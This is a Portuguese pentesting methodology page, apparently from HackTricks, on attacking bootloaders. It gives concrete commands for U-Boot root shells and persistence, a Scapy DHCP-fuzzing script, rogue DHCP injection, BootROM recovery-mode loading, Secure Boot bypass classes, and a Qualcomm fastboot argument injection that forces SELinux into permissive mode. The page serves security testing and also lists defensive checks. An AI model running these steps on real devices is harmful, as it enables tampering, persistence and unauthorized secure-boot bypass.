# Testes de Bootloader

{{#include ../../banners/hacktricks-training.md}}

As etapas a seguir são recomendadas para modificar configurações de inicialização de dispositivos e testar bootloaders como U-Boot e loaders da classe UEFI. Concentre-se em obter execução de código antecipada, avaliar proteções de assinatura/rollback e abusar de caminhos de recuperação ou network-boot.

Relacionado: bypass de secure-boot do MediaTek via patching de bl2_ext:

{{#ref}}
android-mediatek-secure-boot-bl2_ext-bypass-el3.md
{{#endref}}

## U-Boot: ganhos rápidos e abuso do ambiente

1. Acesse o shell do interpretador
- Durante o boot, pressione uma tecla de interrupção conhecida (geralmente qualquer tecla, 0, espaço ou uma sequência "mágica" específica da placa) antes da execução de `bootcmd` para acessar o prompt do U-Boot.

2. Inspecione o estado e as variáveis de boot
- Comandos úteis:
- `printenv` (despeja o ambiente)
- `bdinfo` (informações da placa, endereços de memória)
- `help bootm; help booti; help bootz` (métodos de boot do kernel compatíveis)
- `help ext4load; help fatload; help tftpboot` (loaders disponíveis)

3. Modifique os argumentos de boot para obter um root shell
- Anexe `init=/bin/sh` para que o kernel acesse um shell em vez do init normal:
```
# printenv
# setenv bootargs 'console=ttyS0,115200 root=/dev/mtdblock3 rootfstype=<fstype> init=/bin/sh'
# saveenv
# boot    # ou: run bootcmd
```

4. Faça netboot a partir do seu servidor TFTP
- Configure a rede e obtenha uma imagem de kernel/fit da LAN:
```
# setenv ipaddr 192.168.2.2      # IP do dispositivo
# setenv serverip 192.168.2.1    # IP do servidor TFTP
# saveenv; reset
# ping ${serverip}
# tftpboot ${loadaddr} zImage           # kernel
# tftpboot ${fdt_addr_r} devicetree.dtb # DTB
# setenv bootargs "${bootargs} init=/bin/sh"
# booti ${loadaddr} - ${fdt_addr_r}
```

5. Persista as alterações por meio do ambiente
- Se o armazenamento do env não estiver protegido contra escrita, será possível persistir o controle:
```
# setenv bootcmd 'tftpboot ${loadaddr} fit.itb; bootm ${loadaddr}'
# saveenv
```
- Verifique variáveis como `bootcount`, `bootlimit`, `altbootcmd` e `boot_targets`, que influenciam os caminhos de fallback. Valores configurados incorretamente podem permitir interrupções repetidas para acessar o shell.

6. Verifique recursos de debug/inseguros
- Procure por: `bootdelay` > 0, `autoboot` desabilitado, `usb start; fatload usb 0:1 ...` irrestrito, capacidade de usar `loady`/`loads` via serial, `env import` a partir de mídia não confiável e kernels/ramdisks carregados sem verificação de assinatura.

7. Testes de imagem/verificação do U-Boot
- Se a plataforma alegar usar secure/verified boot com imagens FIT, tente imagens não assinadas e adulteradas:
```
# tftpboot ${loadaddr} fit-unsigned.itb; bootm ${loadaddr}     # deve FALHAR se a assinatura FIT for obrigatória
# tftpboot ${loadaddr} fit-signed-badhash.itb; bootm ${loadaddr} # deve FALHAR
# tftpboot ${loadaddr} fit-signed.itb; bootm ${loadaddr}        # só deve iniciar se a chave for confiável
```
- A ausência de `CONFIG_FIT_SIGNATURE`/`CONFIG_(SPL_)FIT_SIGNATURE` ou o comportamento legado `verify=n` frequentemente permite iniciar payloads arbitrários.
- Não pare em um simples resultado de permitir/negar: pesquisas recentes sobre FIT mostraram que o próprio caminho de verificação pode ser uma superfície de ataque pre-auth. Faça testes negativos com dados FIT armazenados externamente (`data-offset`, `data-position`, `data-size`), seleção de configuração assinada, `loadables` e tratamento de overlay / `extra-conf`.
- Se você tiver uma source tree correspondente, `test/vboot/vboot_test.sh` é uma maneira rápida de reproduzir o comportamento de verificação FIT no sandbox do U-Boot antes de tocar no hardware real.

8. Standard Boot (`bootstd`), `extlinux` e bootflows de scripts
- Em builds modernos do U-Boot, `bootcmd` frequentemente é apenas um wrapper em torno do Standard Boot. Isso significa que mídia gravável, PXE ou SPI flash podem se tornar a verdadeira trust boundary, mesmo quando o ambiente visível parece inofensivo.
- O `bootmeth` do `extlinux` procura `extlinux/extlinux.conf` em `/` e `/boot`; o `bootmeth` de script procura primeiro `boot.scr.uimg` e depois `boot.scr`. No network boot, o nome do script pode vir de `boot_script_dhcp`.
- Comandos úteis para triagem:
```
# bootflow scan -l
# bootflow list
# bootflow select 0; bootflow info -d
# bootmeth list
# bootmeth order "extlinux script pxe"
```
- Casos de abuso a testar: mídia USB/SD controlada pelo atacante aparecendo antes em `boot_targets`, `/boot/extlinux/extlinux.conf` gravável, TFTP malicioso fornecendo `boot.scr` ou execução de scripts apoiada por SPI via `script_offset_f`.
- Se a plataforma depender da verificação FIT, certifique-se de que as configurações sejam assinadas no nível da configuração, e não apenas por imagem; `required-mode=all` é mais forte do que aceitar qualquer chave obrigatória individual.

## Superfície de network boot (DHCP/PXE) e servidores maliciosos

9. Fuzzing de parâmetros PXE/DHCP
- O tratamento legado de BOOTP/DHCP do U-Boot já apresentou problemas de memory-safety. Por exemplo, o CVE‑2024‑42040 descreve uma memory disclosure via respostas DHCP criadas para esse fim, que podem causar leak de bytes da memória do U-Boot de volta pela rede. Exercite os caminhos de código DHCP/PXE com valores excessivamente longos ou de borda (opção 67 bootfile-name, opções do fornecedor e campos file/servername) e observe travamentos/leaks.
- Snippet mínimo de Scapy para estressar parâmetros de boot durante o netboot:
```python
from scapy.all import *
offer = (Ether(dst='ff:ff:ff:ff:ff:ff')/
IP(src='192.168.2.1', dst='255.255.255.255')/
UDP(sport=67, dport=68)/
BOOTP(op=2, yiaddr='192.168.2.2', siaddr='192.168.2.1', chaddr=b'\xaa\xbb\xcc\xdd\xee\xff')/
DHCP(options=[('message-type','offer'),
('server_id','192.168.2.1'),
# Valores intencionalmente grandes e estranhos
('bootfile_name','A'*300),
('vendor_class_id','B'*240),
'end']))
sendp(offer, iface='eth0', loop=1, inter=0.2)
```
- Valide também se os campos de nome de arquivo PXE são passados para a lógica de shell/loader sem sanitização quando encadeados a scripts de provisionamento no lado do OS.

10. Testes de command injection em servidor DHCP malicioso
- Configure um serviço DHCP/PXE malicioso e tente injetar caracteres nos campos de nome de arquivo ou nas opções para alcançar command interpreters em estágios posteriores da cadeia de boot. O auxiliar DHCP do Metasploit, `dnsmasq` ou scripts Scapy personalizados funcionam bem. Isole a rede do laboratório primeiro.

## Modos de recuperação da ROM do SoC que substituem o boot normal

Muitos SoCs expõem um modo "loader" do BootROM que aceita código via USB/UART mesmo quando as imagens do flash são inválidas. Se os fusíveis de secure-boot não estiverem queimados, isso pode fornecer execução arbitrária de código muito cedo na cadeia.

- NXP i.MX (Serial Download Mode)
- Ferramentas: `uuu` (mfgtools3) ou `imx-usb-loader`.
- Exemplo: `imx-usb-loader u-boot.imx` para enviar e executar um U-Boot personalizado a partir da RAM.
- Allwinner (FEL)
- Ferramenta: `sunxi-fel`.
- Exemplo: `sunxi-fel -v uboot u-boot-sunxi-with-spl.bin` ou `sunxi-fel write 0x4A000000 u-boot-sunxi-with-spl.bin; sunxi-fel exe 0x4A000000`.
- Rockchip (MaskROM)
- Ferramenta: `rkdeveloptool`.
- Exemplo: `rkdeveloptool db loader.bin; rkdeveloptool ul u-boot.bin` para preparar um loader e fazer upload de um U-Boot personalizado.

Avalie se o dispositivo possui eFuses/OTP de secure-boot queimados. Caso contrário, os modos de download do BootROM frequentemente ignoram qualquer verificação de nível superior (U-Boot, kernel, rootfs), executando seu payload de primeiro estágio diretamente a partir da SRAM/DRAM.

## Bootloaders UEFI/da classe PC: verificações rápidas

11. Testes de adulteração do ESP, rollback e enrollment de chaves
- Monte a EFI System Partition (ESP) e verifique os componentes do loader: `EFI/Microsoft/Boot/bootmgfw.efi`, `EFI/BOOT/BOOTX64.efi`, `EFI/ubuntu/shimx64.efi`, `grubx64.efi` e paths de logos do fornecedor.
- Despeje o estado do Secure Boot e os bancos de chaves a partir do OS quando possível:
```bash
mokutil --sb-state
efi-readvar -v PK
efi-readvar -v KEK
efi-readvar -v db
efi-readvar -v dbx
```
- Se a plataforma estiver em Setup Mode, aceitar enrollment de chaves não autenticado ou vier com uma Platform Key (PK) de teste/padrão (classe PKfail), um administrador local ou atacante com acesso físico poderá inscrever sua própria KEK/db e manter o Secure Boot aparentemente “habilitado” enquanto inicializa binários EFI arbitrários.
- Tente inicializar componentes de boot assinados, downgraded ou conhecidos como vulneráveis, caso as revogações do Secure Boot (dbx) não estejam atualizadas. Se a plataforma ainda confiar em shims/bootmanagers antigos, normalmente será possível carregar seu próprio kernel ou `grub.cfg` a partir do ESP para obter persistência.

12. Testes de revogação de shim / SBAT / dbx obsoletos
- Shims antigos assinados pela Microsoft e forks de fornecedores ainda podem atuar como um caminho de bootkit no estilo BYOVD caso as revogações estejam obsoletas. Em um laboratório isolado, coloque um shim historicamente vulnerável no ESP e tente fazer chainload do seu próprio `grubx64.efi` ou kernel.
- Triagem rápida:
```bash
sbverify --list shimx64.efi
objdump -s -j .sbat shimx64.efi | less
efibootmgr -v
```
- Se o shim ainda for executado apesar de estar na lista de revogação, o firmware/OS possui atualizações `dbx` obsoletas ou confia em um loader derivado que nunca herdou as proteções SBAT upstream.

13. Bugs de parsing de logos de boot (classe LogoFAIL)
- Vários firmwares de OEM/IBV eram vulneráveis a falhas de parsing de imagens em DXE que processam logos de boot. Se um atacante puder colocar uma imagem criada para esse fim no ESP em um path específico do fornecedor (por exemplo, `\EFI\<vendor>\logo\*.bmp`) e reiniciar, poderá ser possível obter execução de código durante o boot antecipado, mesmo com o Secure Boot habilitado. Teste se a plataforma aceita logos fornecidos pelo usuário e se esses paths podem ser gravados a partir do OS.


## Android/Qualcomm ABL + GBL (Android 16): falhas de trust

Em dispositivos Android 16 que usam o ABL da Qualcomm para carregar a **Generic Bootloader Library (GBL)**, valide se o ABL **autentica** o app UEFI que ele carrega da partição `efisp`. Se o ABL verificar apenas a **presença** de um app UEFI e não verificar assinaturas, uma primitiva de escrita em `efisp` se torna **execução de código não assinado pré-OS** durante o boot.

Verificações práticas e caminhos de abuso:

- **primitiva de escrita em efisp**: é necessário ter uma maneira de gravar um app UEFI personalizado em `efisp` (serviço root/privilegiado, bug em app do OEM, caminho de recovery/fastboot). Sem isso, a falha de carregamento do GBL não é diretamente alcançável.
- **injeção de argumentos OEM do fastboot** (bug do ABL): alguns builds aceitam tokens adicionais em `fastboot oem set-gpu-preemption` e os anexam à cmdline do kernel. Isso pode ser usado para forçar o SELinux permissivo, permitindo escritas em partições protegidas:
```bash
fastboot oem set-gpu-preemption 0 androidboot.selinux=permissive
```
Se o dispositivo estiver corrigido, o comando deverá rejeitar argumentos adicionais.
- **desbloqueio do Bootloader por meio de flags persistentes**: um payload no estágio de boot pode alterar flags persistentes de desbloqueio (por exemplo, `is_unlocked=1`, `is_unlocked_critical=1`) para simular `fastboot oem unlock` sem as barreiras de servidor/aprovação do OEM. Essa é uma alteração durável de postura após a próxima reinicialização.

Observações defensivas/de triagem:

- Confirme se o ABL realiza verificação de assinatura no payload GBL/UEFI vindo de `efisp`. Caso contrário, trate `efisp` como uma superfície de persistência de alto risco.
- Verifique se os handlers fastboot OEM do ABL foram corrigidos para **validar a quantidade de argumentos** e rejeitar tokens adicionais.

## Cuidado com o hardware

Tenha cuidado ao interagir com SPI/NAND flash durante o boot antecipado (por exemplo, aterrando pinos para ignorar leituras) e sempre consulte o datasheet do flash. Curtos aplicados no momento errado podem corromper o dispositivo ou o programmer.

## Observações e dicas adicionais

- Tente `env export -t ${loadaddr}` e `env import -t ${loadaddr}` para mover blobs do ambiente entre a RAM e o armazenamento; algumas plataformas permitem importar env de mídia removível sem autenticação.
- Para persistência em sistemas baseados em Linux que inicializam via `extlinux.conf`, modificar a linha `APPEND` (para injetar `init=/bin/sh` ou `rd.break`) na partição de boot geralmente é suficiente quando nenhuma verificação de assinatura é aplicada.
- Se o alvo usar atualizações dual-slot / A/B, revise as técnicas de anti-rollback e slot-desync em [firmware analysis overview](README.md) para não perder trust gaps exclusivos do updater fora do próprio bootloader.
- Se o userland fornecer `fw_printenv/fw_setenv`, valide se `/etc/fw_env.config` corresponde ao armazenamento de env real. Offsets configurados incorretamente permitem ler/gravar a região MTD errada.

## Referências

- [https://scriptingxss.gitbook.io/firmware-security-testing-methodology/](https://scriptingxss.gitbook.io/firmware-security-testing-methodology/)
- [https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot](https://www.binarly.io/blog/finding-logofail-the-dangers-of-image-parsing-during-system-boot)
- [https://nvd.nist.gov/vuln/detail/CVE-2024-42040](https://nvd.nist.gov/vuln/detail/CVE-2024-42040)
- [https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/](https://www.androidauthority.com/qualcomm-snapdragon-8-elite-gbl-exploit-bootloader-unlock-3648651/)
- [https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html](https://bestwing.me/preempted-unlocking-xiaomi-via-two-unsanitized-strings.html)
- [https://source.android.com/docs/core/architecture/bootloader/generic-bootloader](https://source.android.com/docs/core/architecture/bootloader/generic-bootloader)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/f09c2fe3d6c42660587460e31be50c18c8c777ab)
- [https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2](https://git.codelinaro.org/clo/la/abl/tianocore/edk2/-/commit/78297e8cfe091fc59c42fc33d3490e2008910fe2)
- [https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification](https://www.binarly.io/blog/unfit-to-boot-breaking-u-boots-fit-signature-verification)
- [https://kb.cert.org/vuls/id/616257](https://kb.cert.org/vuls/id/616257)
{{#include ../../banners/hacktricks-training.md}}
